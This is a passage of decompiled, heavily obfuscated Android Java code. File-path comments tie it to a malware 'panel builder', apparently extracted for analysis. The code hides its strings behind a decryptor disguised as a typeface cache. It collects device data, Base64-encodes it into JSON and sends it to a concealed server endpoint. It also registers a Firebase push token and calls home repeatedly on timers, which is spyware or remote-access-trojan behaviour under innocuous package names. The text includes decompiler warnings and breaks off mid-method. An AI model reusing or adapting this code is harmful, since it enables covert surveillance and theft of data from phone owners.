package v.s;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.util.Base64;
import androidx.work.CoroutineWorker;
import app.mobilex.plus.receivers.HandlerXNLoader;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import com.google.firebase.messaging.FirebaseMessaging;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class eoUwMTDTg3dRNUqWJq3 extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ Object D5P1xCAyuvgF;
    public Object b1EoSIRjJHO5;
    public int ibVTtJUNfrGYbW;
    public Object pyu8ovAipBTLYAiKab;
    public final /* synthetic */ int xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public eoUwMTDTg3dRNUqWJq3(SyncQYAdapter syncQYAdapter, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = 5;
        this.D5P1xCAyuvgF = syncQYAdapter;
    }

    private static /* synthetic */ void eiysmpwr() {
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) throws JSONException {
        wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) obj;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = (b9xRoaXFR1fmOO2Q) obj2;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
            case 1:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
            case 2:
                eoUwMTDTg3dRNUqWJq3 eouwmtdtg3drnuqwjq3 = (eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                eouwmtdtg3drnuqwjq3.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB);
                return eo0e0FTdv96U7KeCzoB;
            case 3:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
            case 4:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
            case 5:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
            default:
                return ((eoUwMTDTg3dRNUqWJq3) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
        }
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                eoUwMTDTg3dRNUqWJq3 eouwmtdtg3drnuqwjq3 = new eoUwMTDTg3dRNUqWJq3((UrJN9H1OU7p7Jp) this.pyu8ovAipBTLYAiKab, (GRovd1ShkBeHDeJnPBM) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 0);
                eouwmtdtg3drnuqwjq3.b1EoSIRjJHO5 = obj;
                return eouwmtdtg3drnuqwjq3;
            case 1:
                return new eoUwMTDTg3dRNUqWJq3((Context) this.pyu8ovAipBTLYAiKab, (String) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 1);
            case 2:
                return new eoUwMTDTg3dRNUqWJq3((dEuDk0RLJ79RBD8fz4WE) this.pyu8ovAipBTLYAiKab, (CoroutineWorker) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 2);
            case 3:
                return new eoUwMTDTg3dRNUqWJq3((Context) this.b1EoSIRjJHO5, (Intent) this.pyu8ovAipBTLYAiKab, (BroadcastReceiver.PendingResult) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 3);
            case 4:
                return new eoUwMTDTg3dRNUqWJq3((JSONArray) this.b1EoSIRjJHO5, (SyncQYAdapter) this.pyu8ovAipBTLYAiKab, (String) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 4);
            case 5:
                return new eoUwMTDTg3dRNUqWJq3((SyncQYAdapter) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q);
            default:
                return new eoUwMTDTg3dRNUqWJq3((r5XEUfod5GSCCwq6c) this.b1EoSIRjJHO5, (sFdNPiaH9eT4T) this.pyu8ovAipBTLYAiKab, (d7yjIEB02ZavJfb7Dt) this.D5P1xCAyuvgF, b9xroaxfr1fmoo2q, 6);
        }
    }

    /* JADX WARN: Code duplicated, block: B:116:0x02f5  */
    /* JADX WARN: Code duplicated, block: B:125:0x0314  */
    /* JADX WARN: Code duplicated, block: B:128:0x0321  */
    /* JADX WARN: Code duplicated, block: B:131:0x0337 A[Catch: all -> 0x0273, Exception -> 0x0277, Merged into TryCatch #1 {all -> 0x0273, Exception -> 0x0277, blocks: (B:88:0x0269, B:93:0x027a, B:145:0x0388, B:94:0x027f, B:142:0x037c, B:95:0x0289, B:139:0x036f, B:96:0x028e, B:136:0x035a, B:97:0x0298, B:129:0x0323, B:131:0x0337, B:133:0x033e, B:98:0x02a2, B:126:0x0316, B:100:0x02ab, B:117:0x02f7, B:123:0x0309, B:104:0x02b3, B:110:0x02cb, B:111:0x02cf, B:113:0x02d8, B:114:0x02d9, B:121:0x02fe, B:107:0x02bb, B:149:0x039d, B:122:0x02ff), top: B:210:0x025e }] */
    /* JADX WARN: Code duplicated, block: B:132:0x033c  */
    /* JADX WARN: Code duplicated, block: B:135:0x0357  */
    /* JADX WARN: Code duplicated, block: B:138:0x036e  */
    /* JADX WARN: Code duplicated, block: B:141:0x037b  */
    /* JADX WARN: Code duplicated, block: B:144:0x0386  */
    /* JADX WARN: Code duplicated, block: B:212:0x02d0 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:237:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:52:0x013d A[Catch: Exception -> 0x00cc, TryCatch #2 {Exception -> 0x00cc, blocks: (B:28:0x00c7, B:49:0x0132, B:50:0x0138, B:52:0x013d, B:54:0x0190, B:55:0x0196, B:56:0x01ae, B:35:0x00da, B:37:0x00eb, B:38:0x0101, B:40:0x010e, B:42:0x0116, B:43:0x011c, B:45:0x0120), top: B:211:0x00b9 }] */
    /* JADX WARN: Code duplicated, block: B:54:0x0190 A[Catch: Exception -> 0x00cc, TryCatch #2 {Exception -> 0x00cc, blocks: (B:28:0x00c7, B:49:0x0132, B:50:0x0138, B:52:0x013d, B:54:0x0190, B:55:0x0196, B:56:0x01ae, B:35:0x00da, B:37:0x00eb, B:38:0x0101, B:40:0x010e, B:42:0x0116, B:43:0x011c, B:45:0x0120), top: B:211:0x00b9 }] */
    /* JADX WARN: Code duplicated, block: B:56:0x01ae A[Catch: Exception -> 0x00cc, TRY_LEAVE, TryCatch #2 {Exception -> 0x00cc, blocks: (B:28:0x00c7, B:49:0x0132, B:50:0x0138, B:52:0x013d, B:54:0x0190, B:55:0x0196, B:56:0x01ae, B:35:0x00da, B:37:0x00eb, B:38:0x0101, B:40:0x010e, B:42:0x0116, B:43:0x011c, B:45:0x0120), top: B:211:0x00b9 }] */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r13v98, types: [java.io.Serializable, v.s.xuyi7QZPbnP6xOQ3Cu[]] */
    /* JADX WARN: Type inference fix 'apply assigned field type' failed
    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
     */
    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) throws JSONException {
        sRwj1o5wkILuZnl srwj1o5wkiluznl;
        ktukzhfmAkOuMU ktukzhfmakoumu;
        ktukzhfmAkOuMU ktukzhfmakoumu2;
        ktukzhfmAkOuMU ktukzhfmakoumu3;
        String action;
        String strPPWVWMPAUcr9AGNUSxQ;
        String str;
        ktukzhfmAkOuMU ktukzhfmakoumu4;
        ktukzhfmAkOuMU ktukzhfmakoumu5;
        aqjfZUF02xH6w aqjfzuf02xh6w;
        aqjfZUF02xH6w aqjfzuf02xh6w2;
        aqjfZUF02xH6w aqjfzuf02xh6w3;
        String provider;
        String str2 = null;
        Object[] objArr = 0;
        Object[] objArr2 = 0;
        int i = 0;
        int i2 = 1;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i3 = this.ibVTtJUNfrGYbW;
                if (i3 != 0) {
                    if (i3 != 1) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    return eo0e0FTdv96U7KeCzoB;
                }
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) this.b1EoSIRjJHO5;
                UrJN9H1OU7p7Jp urJN9H1OU7p7Jp = (UrJN9H1OU7p7Jp) this.pyu8ovAipBTLYAiKab;
                GRovd1ShkBeHDeJnPBM gRovd1ShkBeHDeJnPBM = (GRovd1ShkBeHDeJnPBM) this.D5P1xCAyuvgF;
                sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
                NhN5GSKLYh6STld4 jnC75xOgwtSSKHn30v = new JnC75xOgwtSSKHn30v(gRovd1ShkBeHDeJnPBM, objArr == true ? 1 : 0, i);
                HT6Px2xDdrmDEbykyYy hT6Px2xDdrmDEbykyYyDDIMxZXP1V8HdM = y6jRGLEWNMir.dDIMxZXP1V8HdM(-2, 1, 4);
                cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(wh3lv6s5rs6zqjv.w9sT1Swbhx3hs(), snackioajero, true);
                AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                    cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
                }
                R5WF639wwoyEjivV7M7 r5WF639wwoyEjivV7M7 = new R5WF639wwoyEjivV7M7(cptq2xmcb5jsaehnWotphlvK9sPbXJ, hT6Px2xDdrmDEbykyYyDDIMxZXP1V8HdM);
                r5WF639wwoyEjivV7M7.YIgR6F2ZXmLx2ul(3, r5WF639wwoyEjivV7M7, jnC75xOgwtSSKHn30v);
                this.ibVTtJUNfrGYbW = 1;
                Object objPyu8ovAipBTLYAiKab = OFMrQsTe5s1KYV0lq.pyu8ovAipBTLYAiKab(urJN9H1OU7p7Jp, r5WF639wwoyEjivV7M7, true, this);
                if (objPyu8ovAipBTLYAiKab != pjn1l01kdmwnpcy0dad) {
                    objPyu8ovAipBTLYAiKab = eo0e0FTdv96U7KeCzoB;
                }
                return objPyu8ovAipBTLYAiKab == pjn1l01kdmwnpcy0dad ? pjn1l01kdmwnpcy0dad : eo0e0FTdv96U7KeCzoB;
            case 1:
                String str3 = (String) this.D5P1xCAyuvgF;
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad2 = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i4 = this.ibVTtJUNfrGYbW;
                try {
                    if (i4 != 0) {
                        if (i4 == 1) {
                            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                        } else {
                            if (i4 != 2) {
                                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                            }
                            srwj1o5wkiluznl = (sRwj1o5wkILuZnl) this.b1EoSIRjJHO5;
                            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                            ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                        }
                        ktukzhfmAkOuMU ktukzhfmakoumu6 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00070073005D008200E200AD00D700A300630045007600B400B000BE00C000A4002B007F004D008200B000AC00D700A90037002C001B");
                        srwj1o5wkiluznl.dDIMxZXP1V8HdM.size();
                        TypefaceCache.obtain("0063007B0048008000E3");
                        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                    }
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    this.ibVTtJUNfrGYbW = 1;
                    if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(5000L, this) == pjn1l01kdmwnpcy0dad2) {
                        return pjn1l01kdmwnpcy0dad2;
                    }
                    int i5 = aPiYFOqe3eIAlt.dDIMxZXP1V8HdM;
                    sRwj1o5wkILuZnl srwj1o5wkiluznlDDIMxZXP1V8HdM = aPiYFOqe3eIAlt.dDIMxZXP1V8HdM((Context) this.pyu8ovAipBTLYAiKab, str3);
                    ArrayList arrayList = srwj1o5wkiluznlDDIMxZXP1V8HdM.dDIMxZXP1V8HdM;
                    if (!arrayList.isEmpty()) {
                        String strEncodeToString = Base64.encodeToString(aPiYFOqe3eIAlt.vekpFI4d1Nc4fakF(srwj1o5wkiluznlDDIMxZXP1V8HdM).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 2);
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), str3);
                        jSONObject.put(TypefaceCache.obtain("0030007B004800B800F100AD00D100AF002A0060005E00B800F600B600DE00A2"), strEncodeToString);
                        jSONObject.put(TypefaceCache.obtain("0030007B004800B800F100AD00D100AF002A0060005E00B800F600B600DE00A2002D007700560082"), aPiYFOqe3eIAlt.JXn4Qf7zpnLjP5(str3));
                        jSONObject.put(TypefaceCache.obtain("0030007B004800B800F300B000C700A90037"), arrayList.size());
                        ktukzhfmAkOuMU ktukzhfmakoumu7 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        String strObtain = TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B300220039005F008200E600B600D100A2006C0063004B008300F100AB00D7");
                        this.b1EoSIRjJHO5 = srwj1o5wkiluznlDDIMxZXP1V8HdM;
                        this.ibVTtJUNfrGYbW = 2;
                        if (ktukzhfmakoumu7.DVTNwpDEVsUKuznof(strObtain, jSONObject, false, this) == pjn1l01kdmwnpcy0dad2) {
                            return pjn1l01kdmwnpcy0dad2;
                        }
                        srwj1o5wkiluznl = srwj1o5wkiluznlDDIMxZXP1V8HdM;
                        ktukzhfmAkOuMU ktukzhfmakoumu8 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00070073005D008200E200AD00D700A300630045007600B400B000BE00C000A4002B007F004D008200B000AC00D700A90037002C001B");
                        srwj1o5wkiluznl.dDIMxZXP1V8HdM.size();
                        TypefaceCache.obtain("0063007B0048008000E3");
                    }
                    break;
                } catch (Exception e) {
                    ktukzhfmAkOuMU ktukzhfmakoumu9 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                    TypefaceCache.obtain("00070073005D008200E200AD00D700A300630045007600B400B000BE00C000A4002B007F004D008200B000BA00C000B5002C0064000100C7");
                    e.getMessage();
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 2:
                int i6 = this.ibVTtJUNfrGYbW;
                if (i6 == 0) {
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    this.b1EoSIRjJHO5 = (dEuDk0RLJ79RBD8fz4WE) this.pyu8ovAipBTLYAiKab;
                    this.ibVTtJUNfrGYbW = 1;
                    throw new IllegalStateException("Not implemented");
                }
                if (i6 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                dEuDk0RLJ79RBD8fz4WE deudk0rlj79rbd8fz4we = (dEuDk0RLJ79RBD8fz4WE) this.b1EoSIRjJHO5;
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                deudk0rlj79rbd8fz4we.w9sT1Swbhx3hs.pyu8ovAipBTLYAiKab(obj);
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 3:
                BroadcastReceiver.PendingResult pendingResult = (BroadcastReceiver.PendingResult) this.D5P1xCAyuvgF;
                Context context = (Context) this.b1EoSIRjJHO5;
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad3 = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i7 = 8;
                try {
                    try {
                        switch (this.ibVTtJUNfrGYbW) {
                            case 0:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                this.ibVTtJUNfrGYbW = 1;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(2000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                XlNqgz8EVh2x11Ly xlNqgz8EVh2x11Ly = FirebaseMessaging.hjneShqpF9Tis4;
                                synchronized (FirebaseMessaging.class) {
                                    FirebaseMessaging firebaseMessaging = FirebaseMessaging.getInstance(dfwkxUDiclPw1BowH4.w9sT1Swbhx3hs());
                                }
                                firebaseMessaging.getClass();
                                al3CoDKXO0nvx al3codkxo0nvx = new al3CoDKXO0nvx();
                                firebaseMessaging.xDyLpEZyrcKVe0.execute(new A68NpXPqwTFos99nt(firebaseMessaging, i7, al3codkxo0nvx));
                                SQzPENpgvzKX9IlD sQzPENpgvzKX9IlD = al3codkxo0nvx.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 2;
                                obj = FZ1sl4mHq4J0hOEYC.w9sT1Swbhx3hs(sQzPENpgvzKX9IlD, this);
                                if (obj == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                str2 = (String) obj;
                                ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 3;
                                if (ktukzhfmakoumu.nQilHWaqS401ZtR(context, str2, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 4;
                                if (ktukzhfmakoumu2.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                String strObtain2 = TypefaceCache.obtain("002100790054009300CF");
                                action = ((Intent) this.pyu8ovAipBTLYAiKab).getAction();
                                if (action != null) {
                                    strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(action, action);
                                } else {
                                    strPPWVWMPAUcr9AGNUSxQ = "unknown";
                                }
                                str = strObtain2 + strPPWVWMPAUcr9AGNUSxQ;
                                this.ibVTtJUNfrGYbW = 5;
                                if (ktukzhfmakoumu3.Qrz92kRPw4GcghAc(context, str, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                int i8 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                this.ibVTtJUNfrGYbW = 6;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 1:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                XlNqgz8EVh2x11Ly xlNqgz8EVh2x11Ly2 = FirebaseMessaging.hjneShqpF9Tis4;
                                synchronized (FirebaseMessaging.class) {
                                    FirebaseMessaging firebaseMessaging2 = FirebaseMessaging.getInstance(dfwkxUDiclPw1BowH4.w9sT1Swbhx3hs());
                                    firebaseMessaging2.getClass();
                                    al3CoDKXO0nvx al3codkxo0nvx2 = new al3CoDKXO0nvx();
                                    firebaseMessaging2.xDyLpEZyrcKVe0.execute(new A68NpXPqwTFos99nt(firebaseMessaging2, i7, al3codkxo0nvx2));
                                    SQzPENpgvzKX9IlD sQzPENpgvzKX9IlD2 = al3codkxo0nvx2.dDIMxZXP1V8HdM;
                                    this.ibVTtJUNfrGYbW = 2;
                                    obj = FZ1sl4mHq4J0hOEYC.w9sT1Swbhx3hs(sQzPENpgvzKX9IlD2, this);
                                    if (obj == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    str2 = (String) obj;
                                    ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    this.ibVTtJUNfrGYbW = 3;
                                    if (ktukzhfmakoumu.nQilHWaqS401ZtR(context, str2, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    this.ibVTtJUNfrGYbW = 4;
                                    if (ktukzhfmakoumu2.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    String strObtain3 = TypefaceCache.obtain("002100790054009300CF");
                                    action = ((Intent) this.pyu8ovAipBTLYAiKab).getAction();
                                    if (action != null) {
                                        strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(action, action);
                                    } else {
                                        strPPWVWMPAUcr9AGNUSxQ = "unknown";
                                    }
                                    str = strObtain3 + strPPWVWMPAUcr9AGNUSxQ;
                                    this.ibVTtJUNfrGYbW = 5;
                                    if (ktukzhfmakoumu3.Qrz92kRPw4GcghAc(context, str, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    int i9 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                    TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                    this.ibVTtJUNfrGYbW = 6;
                                    if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    this.ibVTtJUNfrGYbW = 7;
                                    if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    this.ibVTtJUNfrGYbW = 8;
                                    if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    this.ibVTtJUNfrGYbW = 9;
                                    if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                        return pjn1l01kdmwnpcy0dad3;
                                    }
                                    return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                                }
                            case 2:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                str2 = (String) obj;
                                ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 3;
                                if (ktukzhfmakoumu.nQilHWaqS401ZtR(context, str2, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 4;
                                if (ktukzhfmakoumu2.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                String strObtain4 = TypefaceCache.obtain("002100790054009300CF");
                                action = ((Intent) this.pyu8ovAipBTLYAiKab).getAction();
                                if (action != null) {
                                    strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(action, action);
                                } else {
                                    strPPWVWMPAUcr9AGNUSxQ = "unknown";
                                }
                                str = strObtain4 + strPPWVWMPAUcr9AGNUSxQ;
                                this.ibVTtJUNfrGYbW = 5;
                                if (ktukzhfmakoumu3.Qrz92kRPw4GcghAc(context, str, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                int i10 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                this.ibVTtJUNfrGYbW = 6;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
